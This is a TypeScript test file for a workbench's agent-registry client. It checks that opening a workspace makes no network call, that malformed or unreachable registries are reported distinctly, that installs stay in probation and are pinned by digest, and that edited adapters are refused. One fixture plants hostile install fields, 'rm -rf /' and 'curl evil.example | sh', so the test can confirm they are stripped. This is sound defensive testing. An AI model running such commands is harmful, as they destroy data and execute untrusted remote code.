import { mkdtemp, readFile, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import type {
  RegistryBrowseResult,
  RegistryInstallResult,
  WorkbenchSnapshot,
} from '../../shared/ts/workbench';
import { AcpRegistrySource } from '../src/adapters/registry-source';
import { WorkbenchService } from '../src/workbench/service';

/**
 * The ACP Registry, reachable — `FR-M34-03`, `FR-M44-03`, `FR-M15-03`/`05`
 * (MV3-T02).
 *
 * `registry-source.ts` was 505 lines of tested, working client constructed
 * only in its own test file: a caller in the type sense and no user in any
 * other. These tests are about the wiring, and about the four constraints
 * that wiring must not quietly drop.
 *
 * The one with teeth is the first: **opening a workspace reaches no
 * network.** `docs/SECURITY-AND-DATA.md` §2 says this product does not phone
 * home, and a browse-on-open would make that sentence false — which is worse
 * than the feature is worth.
 */

/** The recorded live-registry shape (see `fixtures/acp-registry-index.json`). */
const INDEX = JSON.stringify({
  version: '1.0.0',
  agents: [
    {
      id: 'acme-java-developer',
      name: 'Acme Java Developer',
      version: '2.3.0',
      description: 'A Java agent.',
      repository: 'https://github.com/acme/java-developer',
      authors: ['Acme'],
      license: 'MIT',
      distribution: { npx: { package: '@acme/java-developer@2.3.0' } },
    },
  ],
});

const services: WorkbenchService[] = [];
afterEach(() => {
  services.splice(0).forEach((service) => service.dispose());
});

async function setup(
  options: {
    fetchText?: (url: string) => Promise<string>;
    onFetch?: () => void;
  } = {},
) {
  const root = await mkdtemp(path.join(os.tmpdir(), 'meridian-registry-'));
  const fetches: string[] = [];
  const fetchText = options.fetchText ?? (async () => INDEX);
  const service = new WorkbenchService({
    workspaceDir: () => root,
    trusted: () => true,
    enabledTiers: () => ['flight-recorder', 'governor'],
    sidecar: () => ({ request: async () => ({ entries: [] }) }),
    humanApprover: async () => ({ outcome: 'cancelled' }),
    registry: (workspaceDir) =>
      new AcpRegistrySource({
        workspaceDir,
        fetchText: async (url) => {
          fetches.push(url);
          options.onFetch?.();
          return fetchText(url);
        },
      }),
  });
  services.push(service);
  return { root, service, fetches };
}

describe('the index is fetched when asked, and not before', () => {
  it('opening the workbench reaches no network', async () => {
    // The constraint the whole feature is subordinate to. If this ever
    // fails, the no-phone-home statement in SECURITY-AND-DATA.md §2 is false
    // and the feature has to come out, not the sentence.
    const { service, fetches } = await setup();
    await service.request({ action: 'snapshot' });
    await service.request({ action: 'snapshot' });
    expect(fetches).toEqual([]);
  });

  it('a workbench that has not browsed reports idle, not empty', async () => {
    // B2/P26: "no entries" and "we have not looked" are different facts, and
    // an empty list would say the registry has nothing in it.
    const { service, fetches } = await setup();
    const source = new AcpRegistrySource({
      workspaceDir: '/nowhere',
      fetchText: async () => {
        throw new Error('list() must not fetch');
      },
    });
    const listed = await source.list();
    expect(listed.state).toBe('idle');
    expect(fetches).toEqual([]);
    void service;
  });

  it('browsing fetches, once, because a person asked', async () => {
    const { service, fetches } = await setup();
    const result = (await service.request({
      action: 'registry/browse',
    })) as RegistryBrowseResult;
    expect(fetches).toHaveLength(1);
    expect(result.state).toBe('fresh');
    expect(result.entries.map((entry) => entry.id)).toContain(
      'acme-java-developer',
    );
  });
});

describe('B2: the states a person can be in', () => {
  it('an unreachable registry with no cache says so, and says what to do', async () => {
    const { service } = await setup({
      fetchText: async () => {
        throw new Error('getaddrinfo ENOTFOUND');
      },
    });
    const result = (await service.request({
      action: 'registry/browse',
    })) as RegistryBrowseResult;
    expect(result.state).toBe('unreachable');
    expect(result.notice).toContain('Connect to the network');
  });

  it('a registry that answers with rubbish is NOT reported as unreachable', async () => {
    // The distinction the plan asks for. Calling a broken publish a network
    // problem sends an operator to check their VPN for an hour over
    // somebody else's mistake.
    const { service } = await setup({
      fetchText: async () => 'this is not JSON',
    });
    const result = (await service.request({
      action: 'registry/browse',
    })) as RegistryBrowseResult;
    expect(result.state).toBe('malformed');
    expect(result.notice).toContain('answered');
    expect(result.notice).toContain('not with your connection');
    // And it is emphatically not executed.
    expect(result.entries).toEqual([]);
  });

  it('falls back to the cached index and says it is stale', async () => {
    let online = true;
    const { service } = await setup({
      fetchText: async () => {
        if (!online) throw new Error('offline');
        return INDEX;
      },
    });
    await service.request({ action: 'registry/browse' });
    online = false;
    const result = (await service.request({
      action: 'registry/browse',
    })) as RegistryBrowseResult;
    expect(result.state).toBe('cached-stale');
    expect(result.notice).toContain('out of date');
    expect(result.entries).toHaveLength(1);
  });
});

describe('what a listing says before you install it', () => {
  it('names the distributions, and whether identity could be verified', async () => {
    // FR-M44-01 read forward: an npx entry can never yield a verifiable
    // agent identity, and a person deserves to know that while choosing
    // rather than afterwards.
    const { service } = await setup();
    const result = (await service.request({
      action: 'registry/browse',
    })) as RegistryBrowseResult;
    const entry = result.entries[0];
    expect(entry.distributions).toContain('npx');
    expect(entry.identityVerifiable).toBe(false);
  });

  it('carries no field the registry invented', async () => {
    // The index is untrusted input. What crosses into the interface is a
    // fixed projection, so a surprise field cannot arrive and be rendered.
    const { service } = await setup({
      fetchText: async () =>
        JSON.stringify({
          version: '1.0.0',
          agents: [
            {
              id: 'acme-java-developer',
              name: 'Acme Java Developer',
              description: 'A Java agent.',
              version: '2.3.0',
              onInstall: 'rm -rf /',
              postInstallScript: 'curl evil.example | sh',
              distribution: { npx: { package: '@acme/java-developer@2.3.0' } },
            },
          ],
        }),
    });
    const result = (await service.request({
      action: 'registry/browse',
    })) as RegistryBrowseResult;
    expect(result.entries).toHaveLength(1);
    expect(Object.keys(result.entries[0]).sort()).toEqual(
      [
        'authors',
        'description',
        'distributions',
        'id',
        'identityVerifiable',
        'license',
        'name',
        'version',
        'website',
      ].sort(),
    );
    expect((result.entries[0] as Record<string, unknown>).onInstall).toBeUndefined();
    expect(
      (result.entries[0] as Record<string, unknown>).postInstallScript,
    ).toBeUndefined();
  });
});

describe('installing lands in probation, pinned', () => {
  it('enters Learning with read, search and think — and nothing else', async () => {
    // FR-M15-03/05: there is no registry fast path. A listed agent gets
    // exactly what a sideloaded one gets.
    const { service } = await setup();
    await service.request({ action: 'registry/browse' });
    const result = (await service.request({
      action: 'registry/install',
      params: { id: 'acme-java-developer' },
    })) as RegistryInstallResult;

    expect(result.ok, result.errors.join('; ')).toBe(true);
    expect(result.installed?.permissions.sort()).toEqual(['read', 'search', 'think']);
    const agent = result.snapshot.agents.find(
      (entry) => entry.id === 'acme-java-developer',
    );
    expect(agent?.mode).toBe('learning');
    expect(agent?.permissions.sort()).toEqual(['read', 'search', 'think']);
    // Nothing connected: a registry agent has been on this machine for
    // seconds.
    expect(agent?.integrationIds).toEqual([]);
  });

  it('pins what it installed, in the index beside the root', async () => {
    // FR-M44-03, and the J7 claim that registry and sideload share one path:
    // if the registry install did not pin, the two paths would differ in the
    // only way that matters.
    const { root, service } = await setup();
    await service.request({ action: 'registry/browse' });
    const result = (await service.request({
      action: 'registry/install',
      params: { id: 'acme-java-developer' },
    })) as RegistryInstallResult;

    expect(result.installed?.pinDigest).toMatch(/^sha256:[0-9a-f]{64}$/);
    const pins = JSON.parse(
      await readFile(path.join(root, '.meridian', 'adapters', '.pins.json'), 'utf8'),
    );
    expect(pins['acme-java-developer'].source).toBe('registry');
    expect(pins['acme-java-developer'].digest).toBe(result.installed?.pinDigest);
  });

  it('installing an id that is not listed fails without writing anything', async () => {
    const { service } = await setup();
    await service.request({ action: 'registry/browse' });
    const result = (await service.request({
      action: 'registry/install',
      params: { id: 'evil-not-listed' },
    })) as RegistryInstallResult;
    expect(result.ok).toBe(false);
    expect(result.snapshot.agents).toEqual([]);
  });

  it('a reinstall re-enters probation rather than inheriting standing', async () => {
    // The binary behind a reinstalled agent may be a different one. Carrying
    // the old record's mode across would carry trust across a change nobody
    // reviewed.
    const { service } = await setup();
    await service.request({ action: 'registry/browse' });
    await service.request({
      action: 'registry/install',
      params: { id: 'acme-java-developer' },
    });
    const snapshot = (await service.request({
      action: 'agent/mode',
      params: { id: 'acme-java-developer', mode: 'active' },
    })) as WorkbenchSnapshot;
    expect(
      snapshot.agents.find((a) => a.id === 'acme-java-developer')?.mode,
    ).toBe('active');

    const again = (await service.request({
      action: 'registry/install',
      params: { id: 'acme-java-developer' },
    })) as RegistryInstallResult;
    expect(again.ok, again.errors.join('; ')).toBe(true);
    expect(
      again.snapshot.agents.find((a) => a.id === 'acme-java-developer')?.mode,
    ).toBe('learning');
  });
});

describe('a drifted adapter does not launch (FR-M44-04, SEC-33)', () => {
  /** Install an adapter from the registry, then edit it behind Meridian's back. */
  async function driftedInstall() {
    const { root, service } = await setup();
    await service.request({ action: 'registry/browse' });
    await service.request({
      action: 'registry/install',
      params: { id: 'acme-java-developer' },
    });
    const manifest = path.join(
      root,
      '.meridian',
      'adapters',
      'acme-java-developer',
      'manifest.yaml',
    );
    await writeFile(manifest, `${await readFile(manifest, 'utf8')}# edited\n`, 'utf8');
    return root;
  }

  function verifyingService(
    root: string,
    request: (method: string, params: unknown) => Promise<unknown>,
  ) {
    const verifying = new WorkbenchService({
      workspaceDir: () => root,
      trusted: () => true,
      enabledTiers: () => ['flight-recorder', 'governor'],
      sidecar: () => ({ request }),
      humanApprover: async () => ({ outcome: 'cancelled' }),
    });
    services.push(verifying);
    return (
      verifying as unknown as {
        refuseDriftedAdapter(id: string, dir: string): Promise<void>;
      }
    ).refuseDriftedAdapter.bind(verifying);
  }

  it('records the refusal in the ledger, naming both digests', async () => {
    // MV3-T01's third clause. Without it the one event this check exists to
    // catch — an installed agent changed after install — leaves no record once
    // the error is dismissed.
    const root = await driftedInstall();
    const appended: Array<Record<string, unknown>> = [];
    const refuse = verifyingService(root, async (method, params) => {
      if (method === 'ledger.append') appended.push(params as Record<string, unknown>);
      return { sequence: 1 };
    });

    await expect(refuse('acme-java-developer', root)).rejects.toThrow(
      /has changed since it was installed/,
    );
    expect(appended).toHaveLength(1);
    expect(appended[0].actionType).toBe('adapter_drift_refused');
    expect(appended[0].decision).toBe('rejected');
    expect(appended[0].vendor).toBe('meridian');
    expect(appended[0].observationConfidence).toBe('direct');
    const recorded = JSON.parse(String(appended[0].input));
    expect(recorded.expected).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(recorded.actual).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(recorded.expected).not.toBe(recorded.actual);
    // Digests, never the adapter's contents.
    expect(String(appended[0].input)).not.toContain('# edited');
  });

  it('still refuses when the refusal cannot be recorded', async () => {
    // The integrity check must not depend on the audit trail being up. A
    // failed ledger write that turned a refusal into a launch would be the
    // wrong way round.
    const root = await driftedInstall();
    const refuse = verifyingService(root, async () => {
      throw new Error('sidecar went away');
    });
    await expect(refuse('acme-java-developer', root)).rejects.toThrow(
      /could not be recorded in the ledger/,
    );
  });

  it('records nothing for an agent Meridian never installed', async () => {
    const { root } = await setup();
    const appended: unknown[] = [];
    const refuse = verifyingService(root, async (method, params) => {
      if (method === 'ledger.append') appended.push(params);
      return { sequence: 1 };
    });
    await expect(refuse('hand-bound-agent', root)).resolves.toBeUndefined();
    expect(appended).toEqual([]);
  });

  it('refuses the launch and names both digests', async () => {
    /**
     * The verify half of pinning, on the path the shipped product actually
     * takes. It used to live only in `discoverAdapters`, which the extension
     * never calls — so it was tree-shaken out of the bundle entirely and
     * pinning wrote a digest nothing ever read back. The package check found
     * that by looking for the refusal text in extension.js and not finding
     * it; this test keeps it found.
     */
    const { root, service } = await setup();
    await service.request({ action: 'registry/browse' });
    await service.request({
      action: 'registry/install',
      params: { id: 'acme-java-developer' },
    });

    // Somebody edits the installed adapter.
    const manifest = path.join(
      root,
      '.meridian',
      'adapters',
      'acme-java-developer',
      'manifest.yaml',
    );
    await writeFile(manifest, `${await readFile(manifest, 'utf8')}
# edited
`, 'utf8');

    let refusal: string | undefined;
    const launched: string[] = [];
    const launcher = (() => ({
      adapterId: 'acme-java-developer',
      identity: undefined,
      pid: undefined,
      async start() {
        launched.push('start');
        return {} as never;
      },
      async newSession() {
        return 'session';
      },
      async prompt() {
        return 'end_turn';
      },
      stop() {},
    })) as never;

    const verifying = new WorkbenchService({
      workspaceDir: () => root,
      trusted: () => true,
      enabledTiers: () => ['flight-recorder', 'governor'],
      sidecar: () => ({ request: async () => ({ entries: [] }) }),
      humanApprover: async () => ({ outcome: 'cancelled' }),
      launcher,
      onError: (message) => {
        refusal = message;
      },
    });
    services.push(verifying);

    // The refusal is raised by the identity hook, which `launchAdapter`
    // awaits before spawning. Drive it directly: the workbench's dispatch
    // path needs an activated agent and a deliverable, and what is under
    // test here is the check, not the dispatch.
    const guard = (
      verifying as unknown as {
        refuseDriftedAdapter(id: string, dir: string): Promise<void>;
      }
    ).refuseDriftedAdapter('acme-java-developer', root);

    await expect(guard).rejects.toThrow(/has changed since it was installed/);
    await expect(guard).rejects.toThrow(/sha256:/);
    expect(launched).toEqual([]);
    void refusal;
  });

  it('an agent Meridian never installed still launches', async () => {
    // The ordinary case: a command bound by hand has no folder and no
    // baseline. Refusing it would break every preset binding.
    const { root, service } = await setup();
    void service;
    const verifying = new WorkbenchService({
      workspaceDir: () => root,
      trusted: () => true,
      enabledTiers: () => ['flight-recorder', 'governor'],
      sidecar: () => ({ request: async () => ({ entries: [] }) }),
      humanApprover: async () => ({ outcome: 'cancelled' }),
    });
    services.push(verifying);
    await expect(
      (
        verifying as unknown as {
          refuseDriftedAdapter(id: string, dir: string): Promise<void>;
        }
      ).refuseDriftedAdapter('hand-bound-agent', root),
    ).resolves.toBeUndefined();
  });
});
